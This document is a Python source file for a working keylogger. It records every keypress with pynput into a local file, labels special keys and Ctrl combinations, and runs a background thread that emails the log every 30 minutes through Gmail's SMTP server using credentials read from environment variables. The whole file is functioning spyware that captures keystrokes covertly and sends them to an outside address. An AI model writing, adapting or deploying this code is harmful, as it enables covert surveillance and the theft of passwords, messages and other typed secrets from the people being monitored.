from pynput.keyboard import Listener, Key
import smtplib
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.mime.base import MIMEBase
from email import encoders
import time
import os
import threading

# Dictionary mapping keys to human-readable strings
key_map = {
    "Key.ctrl_l": " (Left Ctrl) ",
    "Key.ctrl_r": " (Right Ctrl) ",
    "Key.shift": " (Left Shift) ",
    "Key.shift_r": " (Right Shift) ",
    "Key.alt_l": " (Left Alt) ",
    "Key.alt_gr": " (Right Alt) ",
    "Key.space": " (Space) ",
    "Key.enter": "\n",
    "Key.backspace": " (Backspace) ",
    "Key.cmd": " (Windows) ",
    "Key.tab": " (Tab) ",
    "Key.caps_lock": " (Caps Lock) ",
    "Key.num_lock": " (Num Lock) ",
    "Key.scroll_lock": " (Scroll Lock) ",
    "Key.esc": " (Esc) ",
    "Key.delete": " (Delete) ",
    "Key.print_screen": " (Print Screen) ",
    "Key.home": " (Home) ",
    "Key.insert": " (Insert) ",
    "Key.end": " (End) ",
    "Key.page_up": " (Page Up) ",
    # "Key.page_down": " (Page Down) ",
    "Key.menu": " (Menu) ",
    
    # Media Keys
    "Key.media_volume_up": " (Volume Up) ",
    "Key.media_volume_down": " (Volume Down) ",
    "Key.media_volume_mute": " (Volume Mute) ",
    "Key.pause": " (Pause) ",
    
    # Directions
    "Key.left": " (Left Arrow) ",
    "Key.right": " (Right Arrow) ",
    "Key.up": " (Up Arrow) ",
    "Key.down": " (Down Arrow) ",
    
    # Function Keys
    "Key.f1": " (F1) ",
    "Key.f2": " (F2) ",
    "Key.f3": " (F3) ",
    "Key.f4": " (F4) ",
    "Key.f5": " (F5) ",
    "Key.f6": " (F6) ",
    "Key.f7": " (F7) ",
    "Key.f8": " (F8) ",
    "Key.f9": " (F9) ",
    "Key.f10": " (F10) ",
    "Key.f11": " (F11) ",
    "Key.f12": " (F12) ",
    "Key.f24": " (F24) ",
    
    # Numbers
    "<96>": " 0 ",
    "<97>": " 1 ",
    "<98>": " 2 ",
    "<99>": " 3 ",
    "<100>": " 4 ",
    "<101>": " 5 ",
    "<102>": " 6 ",
    "<103>": " 7 ",
    "<104>": " 8 ",
    "<105>": " 9 ",
    "<110>": " . ",
    
    # Key Combinations
    "\x01": " (Ctrl + A) ",
    "\x02": " (Ctrl + B) ",
    "\x03": " (Ctrl + C) ",
    "\x04": " (Ctrl + D) ",
    "\x05": " (Ctrl + E) ",
    "\x06": " (Ctrl + F) ",
    "\x07": " (Ctrl + G) ",
    "\x08": " (Ctrl + H) ",
    "\t": " (Ctrl + I) ",
    "\n": " (Ctrl + J) ",
    "\x0b": " (Ctrl + K) ",
    "\x0c": " (Ctrl + L) ",
    "\r": " (Ctrl + M) ",
    "\x0e": " (Ctrl + N) ",
    "\x0f": " (Ctrl + O) ",
    "\x10": " (Ctrl + P) ",
    "\x11": " (Ctrl + Q) ",
    "\x12": " (Ctrl + R) ",
    "\x13": " (Ctrl + S) ",
    "\x14": " (Ctrl + T) ",
    "\x15": " (Ctrl + U) ",
    "\x16": " (Ctrl + V) ",
    "\x17": " (Ctrl + W) ",
    "\x18": " (Ctrl + X) ",
    "\x19": " (Ctrl + Y) ",
    "\x1a": " (Ctrl + Z) ",
}

# Function to write key presses to a file
def write_to_file(key):
    letter = str(key).replace("'", "")

    # Use the dictionary to get the corresponding letter or use the key itself if not found
    letter = key_map.get(letter, letter) # Default to the key itself if not found in map

    # Write to file (with exception handling)
    try:
        with open("Keys123.txt", "a") as f:
            f.write(letter)
    except Exception as e:
        print(f"Error writing to file: {e}")
    
    # Stopping the script
    if letter == "Key.page_down":
        print("Stopping keylogging !!")
        return False  # Stop the listener

# Rotate the file: rename it with a timestamp and clear it for future use
# def rotate_file(file_path):
#     timestamp = time.strftime("%Y%m%d_%H%M%S")  # Get the current timestamp
#     new_file_name = f"Keys123_{timestamp}.txt"  # Construct a new name with the timestamp

#     try:
#         # Rename the file with the timestamp
#         os.rename(file_path, new_file_name)
#         print(f"File rotated. Old file renamed to {new_file_name}")

#         # Clear the original file for future use (create a new empty file)
#         with open(file_path, 'w'): pass  # This opens and immediately closes the file, effectively clearing it
#         print(f"Original file {file_path} cleared for future use.")
#     except Exception as e:
#         print(f"Error rotating file: {e}")

# def rotate_file_if_needed(file_path):
#     max_size = 10 * 1024 * 1024  # 10 MB
#     if os.path.getsize(file_path) > max_size:
#         rotate_file(file_path)

# Email sending function
def send_email(file_path):
    # Check if the file size exceeds the threshold and rotate if needed
    # rotate_file_if_needed(file_path)
    # Check if the file exists and has content
    if os.path.exists(file_path) and os.path.getsize(file_path) > 0:
        # Set up the email details
        # from_email = "xxx@gmail.com"  # Replace with your email
        from_email = os.getenv("FROM_EMAIL")  # Replace in environment variable
        # to_email = "yyy@gmail.com"  # Replace with recipient email
        to_email = os.getenv("TO_EMAIL")  # Replace in environment variable
        subject = "Automated Key File"
        body = "Please find the attached file."

        # Create the email container
        msg = MIMEMultipart()
        msg['From'] = from_email
        msg['To'] = to_email
        msg['Subject'] = subject

        # Attach the email body
        msg.attach(MIMEText(body, 'plain'))

        # Attach the file
        with open(file_path, 'rb') as attachment:
            part = MIMEBase('application', 'octet-stream')
            part.set_payload(attachment.read())
            encoders.encode_base64(part)
            part.add_header('Content-Disposition', f"attachment; filename={file_path}")
            msg.attach(part)

        # Set up the SMTP server (example for Gmail)
        try:
            server = smtplib.SMTP('smtp.gmail.com', 587)
            server.starttls()  # Secure the connection
            # server.login(from_email, "Pass@123")  # Replace with your email password
            server.login(from_email, os.getenv("EMAIL_PASSWORD")) # Replace in environment variable
            text = msg.as_string()
            server.sendmail(from_email, to_email, text)
            server.quit()
            print("Email sent successfully.")
            # After sending the email, rotate the file to clear it for future use
            # rotate_file(file_path)
        except Exception as e:
            print(f"Failed to send email: {e}")
    else:
        print("File is empty or does not exist, not sending email.")

# Function to send the file every x minutes
def send_file_every_x_minutes(file_path):
    while True:
        send_email(file_path)  # Send the email with the file
        time.sleep(1800)  # Wait for 30 minutes (1800 seconds)

# Start the keylogger listener
listener = Listener(on_press=write_to_file)
listener.start()

# Start sending the email every x minutes in the background using a separate thread
email_thread = threading.Thread(target=send_file_every_x_minutes, args=("Keys123.txt",))
email_thread.daemon = True # Daemonize the email thread so it exits when the main program exits
email_thread.start()

# Keep the program running indefinitely to continue listening for keypresses
try:
    while True:
        time.sleep(0.1)  # Keeps the program alive, allowing both threads to run
except KeyboardInterrupt:
    print("Program terminated.")
